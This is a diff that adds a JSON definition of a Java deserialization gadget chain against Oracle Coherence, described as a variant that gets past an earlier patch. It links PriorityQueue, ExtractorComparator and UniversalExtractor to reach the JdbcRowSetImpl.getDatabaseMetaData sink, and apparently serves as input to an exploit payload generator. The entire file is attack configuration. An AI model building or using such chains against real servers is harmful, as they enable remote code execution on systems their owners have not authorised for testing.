@@ -1,0 +1,22 @@
+{
+  "chain_type": "Coherence UniversalExtractor — post-2555 patch variant",
+  "root_class": "java.util.PriorityQueue",
+  "root_trigger": "readObject→heapify→comparator.compare→ExtractorComparator.compare→extract",
+  "links": [
+    {
+      "class": "com.tangosol.util.comparator.ExtractorComparator",
+      "field_overrides": {
+        "m_extractor": {"$ref": "link:1"}
+      }
+    },
+    {
+      "class": "com.tangosol.util.extractor.UniversalExtractor",
+      "field_overrides": {
+        "m_sName": "getDatabaseMetaData",
+        "m_aoParam": [],
+        "m_nTarget": 0
+      }
+    }
+  ],
+  "sink_method": "JdbcRowSetImpl.getDatabaseMetaData"
+}
